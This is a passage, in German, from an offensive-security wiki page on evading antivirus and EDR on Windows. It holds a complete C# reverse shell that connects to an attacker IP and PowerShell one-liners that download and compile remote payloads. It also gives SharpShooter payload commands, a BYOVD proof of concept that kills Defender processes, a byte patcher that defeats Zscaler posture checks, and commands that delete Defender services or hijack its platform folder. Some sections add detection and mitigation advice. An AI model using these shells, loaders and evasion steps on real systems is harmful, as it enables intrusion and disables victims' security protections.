sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Starte nun **den Listener** mit `msfconsole -r file.rc` und **führe** die **XML-Payload** mit folgendem Befehl aus:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Der aktuelle Defender wird den Prozess sehr schnell beenden.**

### Unsere eigene reverse shell kompilieren

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Erste C#-Revershell

Kompiliere sie mit:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Verwende es mit:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# mithilfe des Compilers

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatischer Download und Ausführung:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Liste der C#-Obfuscatoren: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Python zum Erstellen von Injectors verwenden – Beispiel:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Weitere Tools

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Mehr

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – AV/EDR aus dem Kernel-Space ausschalten

Storm-2603 nutzte ein kleines Konsolenprogramm namens **Antivirus Terminator**, um den Schutz der Endpoints zu deaktivieren, bevor die Ransomware abgelegt wurde. Das Tool bringt seinen **eigenen verwundbaren, aber *signierten* Treiber** mit und missbraucht ihn, um privilegierte Kernel-Operationen auszuführen, die selbst Protected-Process-Light- (PPL-) AV-Dienste nicht blockieren können.<sup>[[12]](#references)</sup>

Wichtigste Erkenntnisse
1. **Signierter Treiber**: Die auf der Festplatte abgelegte Datei heißt `ServiceMouse.sys`, aber die Binärdatei ist der legitim signierte Treiber `AToolsKrnl64.sys` aus dem „System In-Depth Analysis Toolkit“ von Antiy Labs. Da der Treiber eine gültige Microsoft-Signatur besitzt, wird er auch bei aktiviertem Driver-Signature-Enforcement (DSE) geladen.
2. **Dienstinstallation**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Die erste Zeile registriert den Treiber als **Kernel-Service**, und die zweite startet ihn, sodass `\\.\ServiceMouse` aus dem Userland zugänglich wird.
3. **Vom Treiber bereitgestellte IOCTLs**
   | IOCTL code | Capability                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Einen beliebigen Prozess anhand seiner PID beenden (wird verwendet, um Defender-/EDR-Dienste zu beenden) |
   | `0x990000D0` | Eine beliebige Datei auf der Festplatte löschen |
   | `0x990001D0` | Den Treiber entladen und den Service entfernen |

   Minimaler C Proof-of-Concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Warum es funktioniert**: BYOVD umgeht Schutzmaßnahmen im User-Mode vollständig; im Kernel ausgeführter Code kann *geschützte* Prozesse öffnen, beenden oder Kernel-Objekte manipulieren – unabhängig von PPL/PP, ELAM oder anderen Härtungsfunktionen.

Erkennung / Gegenmaßnahmen
• Aktivieren Sie Microsofts Liste blockierter anfälliger Treiber (`HVCI`, `Smart App Control`), damit Windows das Laden von `AToolsKrnl64.sys` verweigert.
• Überwachen Sie das Erstellen neuer *Kernel*-Dienste und lösen Sie einen Alarm aus, wenn ein Treiber aus einem für alle beschreibbaren Verzeichnis geladen wird oder nicht auf der Allowlist steht.
• Achten Sie auf Handles aus dem User-Mode zu benutzerdefinierten Geräteobjekten, auf die verdächtige `DeviceIoControl`-Aufrufe folgen.

### Umgehen der Zscaler-Client-Connector-Statusprüfungen durch Patchen von Binärdateien auf dem Datenträger

Zscalers **Client Connector** wendet Gerätestatusregeln lokal an und nutzt Windows RPC, um die Ergebnisse an andere Komponenten zu übermitteln. Zwei schwache Designentscheidungen ermöglichen eine vollständige Umgehung:

1. Die Statusprüfung erfolgt **vollständig clientseitig** (ein boolescher Wert wird an den Server gesendet).
2. Interne RPC-Endpunkte prüfen lediglich, ob die verbindende ausführbare Datei **von Zscaler signiert** ist (über `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Durch **Patchen von vier signierten Binärdateien auf dem Datenträger** lassen sich beide Mechanismen neutralisieren:

| Binärdatei | Gepatchte ursprüngliche Logik | Ergebnis |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Gibt immer `1` zurück, sodass jede Prüfung als konform gilt |
| `ZSAService.exe` | Indirekter Aufruf von `WinVerifyTrust` | NOP-ed ⇒ jeder Prozess (auch ein nicht signierter) kann eine Verbindung zu den RPC-Pipes herstellen |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Ersetzt durch `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integritätsprüfungen des Tunnels | Kurzgeschlossen |

Auszug aus einem minimalen Patcher:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Nach dem Ersetzen der Originaldateien und dem Neustart des Service-Stacks:

* **Alle** Posture-Checks werden als **grün/konform** angezeigt.
* Nicht signierte oder veränderte Binärdateien können die benannten Pipe-RPC-Endpunkte öffnen (z. B. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Der kompromittierte Host erhält uneingeschränkten Zugriff auf das interne Netzwerk, das durch die Zscaler-Richtlinien definiert ist.

Diese Fallstudie zeigt, wie sich rein clientseitige Vertrauensentscheidungen und einfache Signaturprüfungen mit wenigen Byte-Patches umgehen lassen.

## Missbrauch vertrauenswürdiger Funktionen von Microsoft Defender `BTR.sys`

Defenders **Boot-Time Removal**-Treiber ist ein nützliches Gegenbeispiel zu klassischem BYOVD. `BTR.sys` ist eine legitime, von Microsoft signierte Remediation-Komponente ohne Memory-Corruption-Bug und ohne IOCTL-Schnittstelle; nachdem Administratorzugriff und `SeLoadDriverPrivilege` erlangt wurden, kann ein Operator stattdessen dessen private Remediation-Transaktion fälschen und so die vorgesehenen Datei- und Registry-Operationen im Ring 0 ausführen. Dies ist ein **Primitive zur Neutralisierung von AV/EDR nach einer Kompromittierung, kein Mittel für Initial Access oder Privilege Escalation**. Der Treiber kann aus der `BOOTTIMETOOL`-Ressource der eigenen `MpEngine.dll` des Ziels extrahiert werden, statt einen auffälligen Drittanbieter-Treiber einzubinden.<sup>[[36]](#references)</sup>

### Bereitstellen des One-Shot-Treibers

Defender legt die Ressource normalerweise als Datei mit zufälligem Namen im Format `[a-z]{8}.sys` ab und registriert einen ähnlich benannten Kernel-Service. `DriverEntry` liest den Wert `Args` des Service, öffnet den referenzierten NTFS-ADS, entschlüsselt und validiert die Aktionsliste, schreibt Feedback und gibt nach erfolgreicher Ausführung `0xC0000056` (`STATUS_DELETE_PENDING`) zurück, damit der Treiber entladen wird, statt resident zu bleiben. Ein gefälschter Service weist die folgenden charakteristischen Werte auf.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Der `:changelist`-Stream enthält einen RC4-verschlüsselten Blob. In den analysierten Builds wird ein fester 256-Byte-Schlüssel wiederverwendet, sodass die Verschlüsselung keine Autorisierungsgrenze darstellt. Ein gültiger Klartext besteht aus einem 24-Byte-Global-Header (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, Header-CRC und einer aus dem Payload abgeleiteten Transaktions-ID), gefolgt von einem nullterminierten UTF-16-Feedbackpfad und beliebig vielen Elementen. Jedes Element hat einen 16-Byte-Header (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) sowie aktionsspezifische Daten, die mit **genau vier NUL-Bytes** enden. Jeder Header- und Datenbereich wird unabhängig mit dem CRC-32-Polynom `0xEDB88320`, dem Anfangszustand `0xFFFFFFFF` und **ohne abschließendes XOR** (`~CRC32`) geprüft; der CRC-Zustand wird für jeden Bereich zurückgesetzt.<sup>[[36]](#references)[[37]](#references)</sup>

Die akzeptierten Aktions-IDs machen diese Kernel-Primitiven verfügbar.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Elementdaten | Ergebnis |
| --- | --- | --- |
| 1 | `[UTF-16-Pfad]` | Datei löschen, auch wenn sie gesperrt ist |
| 2 | `[UTF-16-Pfad]` | Leeres Verzeichnis entfernen |
| 3 | `[Flags][Quelle][Ziel]` | Datei in einen vom Angreifer ausgewählten geschützten Pfad verschieben; ein leeres Ziel bedeutet Löschen |
| 4 | `[Flags][Schlüsselpfad]` | Registrierungsschlüssel rekursiv löschen |
| 5 | `[Flags][Schlüsselpfad + "\\" + Wert]` | Registrierungswert löschen |
| 6 | `[Flags][Typ][Größe][Schlüsselpfad + "\\" + Wert][Daten]` | Registrierungswert erstellen/aktualisieren und fehlende Schlüsselpfade erstellen |

Bei den Aktionen 5 und 6 ist das Trennzeichen zwischen Schlüssel und Wert auf dem Draht **zwei aufeinanderfolgende Backslashes**; ein herkömmlich formatierter Pfad wird nicht korrekt aufgeteilt. Die Feedbackdatei spiegelt größtenteils die Anfrage wider, aber die ersten vier Datenbytes jedes Elements werden zu dessen Ergebnis-`NTSTATUS`. Bei den Aktionen 1 und 2, die kein führendes Flags-Feld haben, verschiebt BTR den Pfad in die vier reservierten nachfolgenden Bytes, um Platz für diesen Status zu schaffen.<sup>[[36]](#references)</sup>

### `BTR_CLI`-Workflow und Frühstartfenster

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) implementiert die vollständige Kette: `BTR.sys` aus lokalem Defender extrahieren, `<random>.sys:changelist` und einen Feedback-Stream erstellen, verkettete Aktionen serialisieren, Prüfsummen berechnen und verschlüsseln, den Dienst-Registrierungsschlüssel direkt erstellen und anschließend `NtLoadDriver` für `-trigger now` aufrufen oder den Treiber mit `-trigger boot` als Systemstarttreiber einrichten. Die direkte Bereitstellung in der Registrierung umgeht den normalen SCM-Pfad `CreateServiceW` und erzeugt daher **kein** Ereignis „Dienstinstallation“ mit ID 7045. Durch den Boot-Trigger erstellte Artefakte lassen sich später mit `BTR_CLI.exe -cleanup <service_name>` entfernen.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` ist nicht verwendbar, weil BTR bereits vor der Bereitschaft des Storage-Stacks und des `SystemRoot`-Links Datei-E/A aus `DriverEntry` ausführt. `Start=1` in Kombination mit der hoch priorisierten Gruppe `Boot Bus Extender` führt stattdessen zur Ausführung in Phase 1: NTFS ist nutzbar, aber viele Security-Treiber mit Systemstart und EDR-Dienste im Benutzermodus wurden noch nicht initialisiert. Boot-start-Filter wie `WdFilter` sind möglicherweise bereits geladen, doch BTR kann ihre Binärdateien oder Service-Konfiguration vor dem nächsten Start entfernen und Service-Executables löschen, bevor SCM sie startet. ELAM schließt diese Lücke nicht, da BTR nach der Boot-start-Auswertung ausgeführt wird und eine gültige Microsoft-Signatur besitzt.<sup>[[36]](#references)</sup>

Mehrere Aktionen werden in einer Transaktion ausgeführt. Der PoC stellt Action 1 für den fest codierten Pfad `\SystemRoot\Temp\BootClean.log` voran: BTR erstellt dieses Log, verarbeitet dann seine eigene Löschanforderung und entfernt die Datei vor dem Entladen. Dadurch werden Beweise reduziert. Werden Rückmeldedaten in `<random>.sys:<random>.dat` abgelegt, lassen sich der Treiber und beide Streams gemeinsam entfernen.<sup>[[36]](#references)[[37]](#references)</sup>

### Korrelationen für Erkennungen mit hoher Aussagekraft

Regeln, die nur auf Signaturen basieren, und die Microsoft-Sperrliste für anfällige Treiber verhindern keinen Missbrauch der vorgesehenen BTR-Funktionalität. Bevorzugt diese Verhaltenskorrelationen und unterscheidet dabei legitime Defender-Abstammung von einem beliebigen Launcher.<sup>[[36]](#references)</sup>

- **Sysmon 15:** Die Erstellung von `.sys:changelist` tritt beim Staging durch BTR immer auf. Ein `.dat`-ADS, der an dieselbe `.sys`-Datei angehängt ist, ist besonders verdächtig, da legitimes Defender Feedback normalerweise unter `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\` ablegt.
- **Sysmon 12/13 ohne System 7045:** Korrelieren Sie die direkte Erstellung von `HKLM\SYSTEM\CurrentControlSet\Services\<random>` mit `Args=...:changelist` und `Group=Boot Bus Extender` mit dem Fehlen eines passenden SCM-Installationsereignisses.
- **Sysmon 6 -> 23:** Korrelieren Sie das Laden eines bekannten BTR-Treibers aus einer Nicht-Defender-Abstammung mit einer anschließenden, `System`/PID 4 zugeordneten Dateilöschung, insbesondere bei Security-Binärdateien.
- **Sysmon 11 -> 23:** Lösen Sie einen Alarm aus, wenn `\SystemRoot\Temp\BootClean.log` schnell durch `System`/PID 4 erstellt und gelöscht wird.
- Beschränken und auditieren Sie die Zuweisung/Aktivierung von `SeLoadDriverPrivilege`; eine Microsoft-Signatur allein reicht nicht als Vertrauensnachweis aus, wenn ein Treiber für ein Security-Tool von `cmd.exe`, PowerShell oder einem unbekannten Prozess gestaged wird.

## Missbrauch von Protected Process Light (PPL) zur Manipulation von AV/EDR mit LOLBINs

Protected Process Light (PPL) setzt eine Signer-/Level-Hierarchie durch, sodass nur gleichwertige oder höher geschützte Prozesse einander manipulieren können. Für offensive Zwecke gilt: Wenn Sie legitim eine PPL-fähige Binärdatei starten und ihre Argumente kontrollieren können, lässt sich harmlose Funktionalität (z. B. Logging) in eine eingeschränkte, durch PPL gestützte Schreibprimitive gegen geschützte Verzeichnisse umwandeln, die von AV/EDR verwendet werden.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Was einen Prozess als PPL ausführt
- Die Ziel-EXE (und alle geladenen DLLs) muss mit einem PPL-fähigen EKU signiert sein.
- Der Prozess muss mit `CreateProcess` und den Flags `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS` erstellt werden.
- Es muss eine kompatible Schutzstufe angefordert werden, die zum Signer der Binärdatei passt (z. B. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` für Anti-Malware-Signer, `PROTECTION_LEVEL_WINDOWS` für Windows-Signer). Bei falschen Stufen schlägt die Erstellung fehl.

Eine umfassendere Einführung in PP/PPL und den LSASS-Schutz finden Sie hier:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher-Tools
- Open-Source-Hilfsprogramm: CreateProcessAsPPL (wählt die Schutzstufe aus und leitet Argumente an die Ziel-EXE weiter):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Anwendungsmuster:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN-Primitive: ClipUp.exe
- Die signierte Systemdatei `C:\Windows\System32\ClipUp.exe` startet sich selbst als untergeordneten Prozess und akzeptiert einen Parameter, um eine Protokolldatei an einem vom Aufrufer angegebenen Pfad zu schreiben.
- Wird sie als PPL-Prozess gestartet, erfolgt der Schreibvorgang mit PPL-Unterstützung.
- ClipUp kann keine Pfade mit Leerzeichen verarbeiten; verwende 8.3-Kurznamen, um auf normalerweise geschützte Speicherorte zu verweisen.

Hilfsbefehle für 8.3-Kurznamen
- Kurznamen auflisten: `dir /x` in jedem übergeordneten Verzeichnis.
- Kurzen Pfad in cmd ermitteln: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Missbrauchskette (abstrakt)
1) Starte das PPL-fähige LOLBIN (ClipUp) mit `CREATE_PROTECTED_PROCESS` über einen Launcher (z. B. CreateProcessAsPPL).
2) Übergib das ClipUp-Argument für den Protokollpfad, um das Erstellen einer Datei in einem geschützten AV-Verzeichnis (z. B. Defender Platform) zu erzwingen. Verwende bei Bedarf 8.3-Kurznamen.
3) Wenn die Zieldatei normalerweise vom laufenden AV geöffnet/gesperrt ist (z. B. MsMpEng.exe), plane den Schreibvorgang beim Systemstart, bevor der AV startet, indem du einen Autostartdienst installierst, der zuverlässig früher ausgeführt wird. Überprüfe die Startreihenfolge mit Process Monitor (Bootprotokollierung).
4) Beim Neustart erfolgt der PPL-gestützte Schreibvorgang, bevor der AV seine Binärdateien sperrt. Dadurch wird die Zieldatei beschädigt und der Start verhindert.

Beispielaufruf (Pfade aus Sicherheitsgründen entfernt/gekürzt):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Hinweise und Einschränkungen
- Du kannst den Inhalt, den ClipUp schreibt, nicht steuern, sondern nur den Speicherort; die Primitive eignet sich daher eher für Beschädigungen als für die präzise Einschleusung von Inhalten.
- Zum Installieren/Starten eines Dienstes und für ein Neustartfenster sind lokale Administratorrechte/SYSTEM erforderlich.
- Das Timing ist entscheidend: Das Ziel darf nicht geöffnet sein; die Ausführung beim Booten vermeidet Dateisperren.

Erkennungen
- Prozesserstellung von `ClipUp.exe` mit ungewöhnlichen Argumenten, insbesondere mit nicht standardmäßigen Startprogrammen als übergeordneten Prozessen, rund um den Bootvorgang.
- Neue Dienste, die so konfiguriert sind, dass sie verdächtige Binärdateien automatisch starten und regelmäßig vor Defender/AV gestartet werden. Untersuche die Erstellung/Änderung von Diensten vor Fehlern beim Start von Defender.
- Überwachung der Dateiintegrität von Defender-Binärdateien/Platform-Verzeichnissen; unerwartete Dateierstellungen/-änderungen durch Prozesse mit Protected-Process-Flags.
- ETW/EDR-Telemetrie: Suche nach Prozessen, die mit `CREATE_PROTECTED_PROCESS` erstellt wurden, und nach anomaler Verwendung von PPL-Leveln durch Nicht-AV-Binärdateien.

Maßnahmen zur Risikominderung
- WDAC/Code Integrity: Beschränke, welche signierten Binärdateien als PPL ausgeführt werden dürfen und unter welchen übergeordneten Prozessen; blockiere ClipUp-Aufrufe außerhalb legitimer Kontexte.
- Diensthygiene: Beschränke das Erstellen/Ändern automatisch startender Dienste und überwache Manipulationen der Startreihenfolge.
- Stelle sicher, dass der Defender-Manipulationsschutz und der Early-Launch-Schutz aktiviert sind; untersuche Startfehler, die auf eine Beschädigung von Binärdateien hinweisen.
- Ziehe in Betracht, die Generierung von 8.3-Kurznamen auf Volumes zu deaktivieren, auf denen Sicherheitstools liegen, sofern dies mit deiner Umgebung kompatibel ist (gründlich testen).

## Microsoft Defender durch einen Symlink-Hijack des Plattformversionsordners manipulieren

Windows Defender wählt die Plattform, von der es ausgeführt wird, indem es Unterordner in folgendem Verzeichnis auflistet:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Es wählt den Unterordner mit dem lexikografisch höchsten Versionsstring (z. B. `4.18.25070.5-0`) und startet anschließend die Defender-Dienstprozesse von dort (wobei die Dienst-/Registrierungspfade entsprechend aktualisiert werden). Bei dieser Auswahl werden Verzeichniseinträge einschließlich Directory Reparse Points (Symlinks) als vertrauenswürdig behandelt. Ein Administrator kann dies ausnutzen, um Defender auf einen vom Angreifer beschreibbaren Pfad umzuleiten und DLL sideloading oder eine Dienstunterbrechung zu erreichen.<sup>[[21]](#references)[[22]](#references)</sup>

Voraussetzungen
- Lokale Administratorrechte (erforderlich, um Verzeichnisse/Symlinks im Platform-Ordner zu erstellen)
- Möglichkeit zum Neustart oder zum Auslösen einer erneuten Auswahl der Defender-Plattform (Dienstneustart beim Booten)
- Es sind nur integrierte Tools erforderlich (`mklink`)

Warum es funktioniert
- Defender blockiert Schreibvorgänge in seinen eigenen Ordnern, aber bei der Plattformauswahl vertraut es Verzeichniseinträgen und wählt die lexikografisch höchste Version aus, ohne zu prüfen, ob das Ziel auf einen geschützten/vertrauenswürdigen Pfad verweist.

Schritt für Schritt (Beispiel)
1) Erstelle eine beschreibbare Kopie des aktuellen Plattformordners, z. B. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Erstelle innerhalb von Platform einen Verzeichnis-Symlink mit einer höheren Versionsnummer, der auf deinen Ordner verweist:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Trigger-Auswahl (Neustart empfohlen):
```cmd
shutdown /r /t 0
```
4) Überprüfen Sie, ob MsMpEng.exe (WinDefend) vom umgeleiteten Pfad ausgeführt wird:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
You should observe den neuen Prozesspfad unter `C:\TMP\AV\` sowie die Dienstkonfiguration/Registry, die diesen Speicherort widerspiegelt.

Post-exploitation options
- DLL sideloading/code execution: Lege DLLs ab oder ersetze DLLs, die Defender aus seinem Anwendungsverzeichnis lädt, um Code in den Prozessen von Defender auszuführen. Siehe den Abschnitt oben: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Entferne den version-symlink, damit der konfigurierte Pfad beim nächsten Start nicht aufgelöst werden kann und Defender nicht startet:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Beachte, dass diese Technik allein keine Privilegieneskalation ermöglicht; sie erfordert Admin-Rechte.

## API/IAT Hooking + Call-Stack Spoofing mit PIC (Crystal-Kit-Stil)

Red Teams können Runtime-Evasion aus dem C2-Implantat in das Zielmodul selbst verlagern, indem sie dessen Import Address Table (IAT) hooken und ausgewählte APIs über angreiferkontrollierten, positionsunabhängigen Code (PIC) leiten. Dadurch lässt sich die Evasion über die kleine API-Oberfläche hinaus verallgemeinern, die viele Kits bereitstellen (z. B. CreateProcessA), und derselbe Schutz auf BOFs und Post-Exploitation-DLLs ausweiten.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Vorgehensweise auf hoher Ebene
- Ein PIC-Blob mithilfe eines Reflective Loaders neben dem Zielmodul bereitstellen (vorangestellt oder als Begleitdatei). Der PIC muss eigenständig und positionsunabhängig sein.
- Beim Laden der Host-DLL ihre IMAGE_IMPORT_DESCRIPTOR durchlaufen und die IAT-Einträge für die zu hookenden Imports (z. B. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) so ändern, dass sie auf schlanke PIC-Wrapper zeigen.
- Jeder PIC-Wrapper führt vor dem Tail-Call an die echte API-Adresse Evasion-Techniken aus. Typische Techniken sind:
  - Speichermaskierung und -demaskierung rund um den Aufruf (z. B. Beacon-Bereiche verschlüsseln, RWX→RX, Seitennamen/Berechtigungen ändern) und anschließend wiederherstellen.
  - Call-Stack-Spoofing: einen unauffälligen Stack erstellen und zur Ziel-API wechseln, sodass die Call-Stack-Analyse die erwarteten Frames auflöst.<sup>[[9]](#references)</sup>
